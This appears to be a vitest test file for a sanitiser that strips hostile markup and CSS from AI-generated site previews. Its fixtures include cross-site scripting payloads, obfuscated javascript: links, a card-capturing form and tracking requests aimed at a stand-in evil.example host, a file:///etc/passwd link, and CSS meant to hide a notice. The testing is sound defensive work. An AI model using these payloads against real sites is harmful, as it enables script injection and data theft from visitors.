/**
 * BE-605 (REQ-024, ADR 0021, Q-16): the preview sanitiser. Hostile AI output fixtures, each holding one of
 * the things a self-contained preview may never carry; the rendered page holds none of them.
 */
import { createHash } from 'crypto';
import { describe, it, expect } from 'vitest';
import {
  cleanHref,
  cleanStylesheet,
  previewCspForHtml,
  styleHashes,
  renderPreviewDocument,
  sanitizePreviewHtml,
  type PreviewNode,
} from '../src/audit/preview/index.js';

const SITE = 'https://shop.example.in/';

function render(html: string): string {
  const page = sanitizePreviewHtml(html, SITE);
  return renderPreviewDocument({ nodes: page.nodes, css: page.css, language: 'en', host: 'shop.example.in' });
}

/** Every tag of the page, for checks that must look inside markup only. */
function tags(html: string): string[] {
  return html.match(/<[^>]*>/g) ?? [];
}

/** The page frame's own head (fixed meta tags) is excluded: only the body comes from the AI. */
function bodyOf(html: string): string {
  return html.slice(html.indexOf('<body>'));
}

function expectSelfContained(html: string): void {
  const body = bodyOf(html);
  const bodyTags = tags(body);
  expect(body).not.toMatch(/<script/i);
  expect(bodyTags.filter((t) => /\son[a-z]+\s*=/i.test(t))).toEqual([]);
  expect(bodyTags.filter((t) => /javascript:|vbscript:|data:text\/html/i.test(t))).toEqual([]);
  expect(html).not.toMatch(/<meta[^>]*http-equiv=["']?refresh/i);
  expect(html).not.toMatch(/<base\b/i);
  expect(html).not.toMatch(
    /<(iframe|object|embed|form|input|textarea|select|button|link|svg|math|template|noscript)\b/i
  );
  expect(html).not.toMatch(/url\s*\(/i);
  expect(html).not.toMatch(/@import|@font-face/i);
  for (const img of bodyTags.filter((t) => /^<img\b/i.test(t))) {
    expect(img).toMatch(/\ssrc="data:image\/(png|jpeg|gif|webp);base64,/);
  }
  // The only meta tags are the frame's own.
  const metas = tags(html).filter((t) => /^<meta\b/i.test(t));
  expect(metas).toHaveLength(5);
  for (const meta of metas) expect(meta).not.toMatch(/refresh/i);
}

const HOSTILE: Record<string, string> = {
  'script element': '<p>Hi</p><script>alert(1)</script><SCRIPT src="https://evil.example/x.js"></SCRIPT>',
  'script split by a comment': '<scr<!-- x -->ipt>alert(1)</script>',
  'on* attributes': '<p onclick="alert(1)" ONMOUSEOVER=alert(2)>x</p><img src=x onerror=alert(3) alt="pic">',
  'javascript: link': '<a href="javascript:alert(1)">a</a><a href=" JaVaScRiPt:alert(1)">b</a>',
  'entity-encoded javascript: link':
    '<a href="&#106;avascript&colon;alert(1)">a</a><a href="java&#x09;script:alert(1)">b</a>',
  'data:text/html link': '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">a</a>',
  'meta refresh': '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  'base element': '<base href="https://evil.example/"><a href="/about">About</a>',
  'iframe, object and embed':
    '<iframe src="https://evil.example/"></iframe><object data="x.swf"></object><embed src="x.swf"><p>after</p>',
  'forms and inputs': '<form action="https://evil.example/"><input name="card"><button>Pay</button></form>',
  'external stylesheet': '<link rel="stylesheet" href="https://evil.example/s.css"><p>x</p>',
  'web font': '<style>@font-face { font-family: X; src: url(https://evil.example/f.woff2); } p { color: red }</style>',
  'css import': '<style>@import url("https://evil.example/s.css"); @import "x.css"; h1 { color: blue }</style>',
  'css url()': '<style>body { background: url(https://evil.example/t.png) } .a { background-image: u\\72l(x) }</style>',
  'style attribute url()': '<div style="background:url(https://evil.example/t.png); color: red">x</div>',
  'css expression': '<div style="width: expression(alert(1))">x</div>',
  'external image': '<img src="https://evil.example/track.gif" alt="Tracker">',
  'svg with script': '<svg><script>alert(1)</script><image href="x"/></svg><p>ok</p>',
  'style breakout': '<style>p { color: red }</style><style></style><script>alert(1)</script>',
  'unterminated tag': '<p>ok</p><img src="x" onerror="alert(1)"',
  'noscript and template': '<noscript><img src=x onerror=alert(1)></noscript><template><script>1</script></template>',
  'data: html image': '<img src="data:text/html,<script>alert(1)</script>" alt="x">',
};

describe('preview sanitiser: hostile AI output', () => {
  for (const [name, html] of Object.entries(HOSTILE)) {
    it(`removes ${name}`, () => {
      expectSelfContained(render(html));
    });
  }

  it('keeps the safe parts around what it removes', () => {
    const html = render(HOSTILE['iframe, object and embed'] + HOSTILE['css import'] + HOSTILE['forms and inputs']);
    expect(html).toContain('<p>after</p>');
    expect(html).toContain('h1 { color: blue }');
    expect(html).toContain('Pay'); // the button's text stays, the button does not
  });

  it('an image that is not inlined shows its alt text', () => {
    const html = render(HOSTILE['external image']);
    expect(bodyOf(html)).not.toMatch(/<img/i);
    expect(html).toContain('Tracker');
  });

  it('the page frame: preview note first, noindex, strict meta policy, no verdict', () => {
    const html = render('<h1>Fresh vegetables</h1>');
    expect(html).toMatch(/<body>\n<p id="qa-preview-note" role="note">Preview of suggested changes/);
    expect(html).toContain('<meta name="robots" content="noindex, nofollow">');
    expect(html).toMatch(/<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:;/);
    expect(html).not.toMatch(/Ready to release|Not ready yet|release verdict/i);
  });
});

describe('preview sanitiser: links', () => {
  it('relative links become absolute addresses of the site, opening in a new tab', () => {
    const html = render('<a href="/about">About</a><a href="contact?x=1&amp;y=2">Contact</a>');
    expect(html).toContain(
      '<a href="https://shop.example.in/about" target="_blank" rel="noopener noreferrer">About</a>'
    );
    expect(html).toContain(
      'href="https://shop.example.in/contact?x=1&amp;y=2" target="_blank" rel="noopener noreferrer"'
    );
  });

  it("an AI's own target and rel are replaced", () => {
    const html = render('<a href="https://shop.example.in/" target="_self" rel="opener">Home</a>');
    expect(html).toContain('<a href="https://shop.example.in/" target="_blank" rel="noopener noreferrer">Home</a>');
  });

  it('an in-page link keeps its href only when the id exists', () => {
    const html = render('<a href="#offers">Offers</a><a href="#missing">Gone</a><section id="offers">x</section>');
    expect(html).toContain('<a href="#offers">Offers</a>');
    expect(html).toContain('<a>Gone</a>');
  });

  it('a repeated id is kept once', () => {
    const html = render('<p id="a">1</p><p id="a">2</p>');
    expect(html.match(/id="a"/g)).toHaveLength(1);
  });

  it('the frame’s reserved ids and classes cannot be taken', () => {
    const html = render('<p id="qa-preview-note" class="qa-preview-menu big">x</p>');
    expect(html.match(/id="qa-preview-note"/g)).toHaveLength(1);
    expect(html).toContain('<p class="big">x</p>');
  });

  it('cleanHref accepts http(s), mailto, tel and #id only', () => {
    expect(cleanHref('/a', SITE)).toBe('https://shop.example.in/a');
    expect(cleanHref('https://user:pw@shop.example.in/', SITE)).toBe('https://shop.example.in/');
    expect(cleanHref('mailto:hi@shop.example.in', SITE)).toBe('mailto:hi@shop.example.in');
    expect(cleanHref('tel:+914412345678', SITE)).toBe('tel:+914412345678');
    expect(cleanHref('#top', SITE)).toBe('#top');
    expect(cleanHref('#bad id', SITE)).toBeNull();
    expect(cleanHref('javascript:alert(1)', SITE)).toBeNull();
    expect(cleanHref('vbscript:x', SITE)).toBeNull();
    expect(cleanHref('data:text/html,x', SITE)).toBeNull();
    expect(cleanHref('file:///etc/passwd', SITE)).toBeNull();
  });
});

describe('preview sanitiser: CSS and text', () => {
  it('keeps plain rules and @media, drops the rest', () => {
    const css = cleanStylesheet(
      '/* c */ h1 { color: #123; font-size: 2rem } @media (max-width: 600px) { h1 { font-size: 1.5rem } } ' +
        '@keyframes k { from { opacity: 0 } } p::before { content: "Certified" } .x { position: fixed; color: red }'
    );
    expect(css).toContain('h1 { color: #123; font-size: 2rem }');
    expect(css).toContain('@media (max-width: 600px) {\nh1 { font-size: 1.5rem }\n}');
    expect(css).not.toMatch(/keyframes|content|fixed/);
    expect(css).toContain('.x { color: red }');
  });

  it('text is escaped, never markup', () => {
    const page = sanitizePreviewHtml('<p>&lt;script&gt;alert(1)&lt;/script&gt; 5 &gt; 3</p>', SITE);
    const html = renderPreviewDocument({ nodes: page.nodes, css: page.css, language: 'en', host: 'h' });
    expect(html).toContain('<p>&lt;script&gt;alert(1)&lt;/script&gt; 5 &gt; 3</p>');
  });

  it('unclosed elements are closed and stray end tags dropped', () => {
    const page = sanitizePreviewHtml('<div><p>a</span></div></div>', SITE);
    const opens = page.nodes.filter((n: PreviewNode) => n.kind === 'open').length;
    const closes = page.nodes.filter((n: PreviewNode) => n.kind === 'close').length;
    expect(opens).toBe(closes);
  });

  it('Urdu pages are right-to-left', () => {
    const page = sanitizePreviewHtml('<p>x</p>', SITE);
    const html = renderPreviewDocument({ nodes: page.nodes, css: '', language: 'ur', host: 'h' });
    expect(html).toContain('<html lang="ur" dir="rtl">');
  });
});

describe('style hashes (DEC-008)', () => {
  const sha = (text: string): string => `'sha256-${createHash('sha256').update(text, 'utf8').digest('base64')}'`;

  it('hashes the exact text of each style element', () => {
    expect(styleHashes('<style>a{color:red}</style><p>x</p><STYLE media="all">\nb{}\n</STYLE>')).toEqual([
      sha('a{color:red}'),
      sha('\nb{}\n'),
    ]);
  });

  it('a page with no style element gets no style hash', () => {
    expect(styleHashes('<p>x</p>')).toEqual([]);
    const csp = previewCspForHtml('<p>x</p>');
    expect(csp).toContain("style-src 'none'");
    expect(csp).not.toContain('sha256-');
  });

  it('the header policy holds the hash of the rendered page style, never unsafe-inline', () => {
    const html = render('<h1>Hi</h1>');
    const texts = styleTexts(html);
    const csp = previewCspForHtml(html);
    expect(csp).toContain(`style-src ${texts.map(sha).join(' ')};`);
    expect(csp).not.toContain('unsafe-inline');
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
  });

  it("the page's own meta policy carries the same hash and no unsafe-inline", () => {
    const html = render('<h1>Hi</h1>');
    const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(html)?.[1] ?? '';
    for (const text of styleTexts(html)) expect(meta).toContain(sha(text));
    expect(meta).not.toContain('unsafe-inline');
  });

  it('lists a hash for every served style element, in both the header and the meta policy', () => {
    const html = render('<style>.a { color: red }</style><p class="a">x</p>');
    const texts = styleTexts(html);
    expect(texts.length).toBe(2);
    const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(html)?.[1] ?? '';
    const csp = previewCspForHtml(html);
    for (const text of texts) {
      expect(csp).toContain(sha(text));
      expect(meta).toContain(sha(text));
    }
    expect(styleHashes(html)).toHaveLength(2);
  });
});

/** The exact text of each served style element. */
function styleTexts(html: string): string[] {
  return [...html.matchAll(/<style>([\s\S]*?)<\/style>/g)].map((m) => m[1]);
}

describe('unbalanced selectors cannot swallow the frame rules (SEC-002 F-053)', () => {
  const FRAME_START = 'html body > div.qa-preview-root';
  const NOTE_RULE = /html body > p#qa-preview-note\[role="note"\] \{[^}]*display: block !important/;

  for (const [label, selector] of [
    ['bracket', '.qa-preview-root a[x'],
    ['parenthesis', '.a:not(.b'],
    ['double quote', '.a[title="x'],
    ['single quote', ".a[title='x"],
    ['closing without opening', '.a]'],
  ] as const) {
    it(`drops a selector with an unbalanced ${label}`, () => {
      expect(cleanStylesheet(`${selector} { color: red }`, true)).toBe('');
      const html = render(`<style>${selector} { color: red; display: none }</style><p>x</p>`);
      const styles = styleTexts(html);
      expect(styles).toHaveLength(2);
      expect(styles[0]).not.toContain('display: none');
      expect(styles[1]).toContain(FRAME_START);
      expect(styles[1]).toMatch(NOTE_RULE);
      expect(styles[1]).toContain('.qa-preview-menu a { margin-right: 12px; }');
    });
  }

  it('keeps balanced brackets, parentheses and quotes', () => {
    const out = cleanStylesheet('a[href="x]y"]:not(.b) { color: red }', true);
    expect(out).toContain('.qa-preview-root a[href="x]y"]:not(.b) { color: red }');
  });

  it('serves the frame rules in their own element, after the AI rules', () => {
    const html = render('<style>.a { color: red }</style><p class="a">x</p>');
    const styles = styleTexts(html);
    expect(styles[0]).toContain('.qa-preview-root .a');
    expect(styles[0]).not.toContain(FRAME_START);
    expect(styles[1].trimStart().startsWith(FRAME_START)).toBe(true);
  });
});

describe('preview sanitiser: hostile CSS cannot hide or cover the note (SEC-002)', () => {
  const HOSTILE_CSS = [
    'p[role=note] { display: none }',
    'body > p:first-child { visibility: hidden; opacity: 0 }',
    'html body > p { height: 0; overflow: hidden; transform: scale(0); clip-path: inset(100%) }',
    ':root p, * { display: none }',
    '* > p { opacity: 0 }',
    'p:first-child, .a ~ p, [role="note"] { display: none }',
    '.cover { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999; background: #fff }',
    '.x { position: fixed; z-index: 5 }',
  ].join('\n');

  const html = render(`<style>${HOSTILE_CSS}</style><p class="cover">AI</p><p>two</p>`);
  const style = styleTexts(html).join('\n');
  const aiCss = style.slice(0, style.indexOf('html body > div.qa-preview-root'));

  it('refuses html, body, :root, [role], leading * and combinators, absolute, fixed and z-index', () => {
    expect(aiCss).not.toMatch(/body|html|:root|role|z-index|absolute|fixed|\*/);
  });

  it('scopes every surviving AI selector under the root wrapper', () => {
    const scoped = cleanStylesheet(
      'p:first-child, .a ~ p { color: red } @media (max-width: 9px) { h1 { color: blue } }',
      true
    );
    expect(scoped).toContain('.qa-preview-root p:first-child, .qa-preview-root .a ~ p { color: red }');
    expect(scoped).toContain('.qa-preview-root h1 { color: blue }');
    for (const line of aiCss.split('\n').filter((l) => l.includes('{') && !l.startsWith('@'))) {
      expect(line.startsWith('.qa-preview-root ')).toBe(true);
    }
  });

  it('the note is outside the AI wrapper, first in the body, and pinned', () => {
    expect(html.indexOf('id="qa-preview-note"')).toBeLessThan(html.indexOf('<div class="qa-preview-root">'));
    expect(html).toMatch(/<body>\n<p id="qa-preview-note" role="note">[^<]*<\/p>\n<div class="qa-preview-root">/);
    const pin = /html body > p#qa-preview-note\[role="note"\] \{([^}]*)\}/.exec(style)?.[1] ?? '';
    for (const prop of [
      'display: block',
      'visibility: visible',
      'opacity: 1',
      'height: auto',
      'overflow: visible',
      'transform: none',
      'clip-path: none',
      'position: static',
    ]) {
      expect(pin).toContain(`${prop} !important`);
    }
    expect(style).toMatch(/html body > div\.qa-preview-root \{[^}]*overflow: hidden[^}]*contain: paint/);
  });

  it('inline styles cannot move content out of the wrapper or over the note', () => {
    const out = render('<p style="position: absolute; z-index: 9; top: 0; color: red">x</p>');
    expect(out).toContain('<p style="top: 0; color: red">x</p>');
  });

  it('the style hash covers the final style text', () => {
    const csp = previewCspForHtml(html);
    for (const text of styleTexts(html)) {
      expect(csp).toContain(`'sha256-${createHash('sha256').update(text, 'utf8').digest('base64')}'`);
    }
  });
});
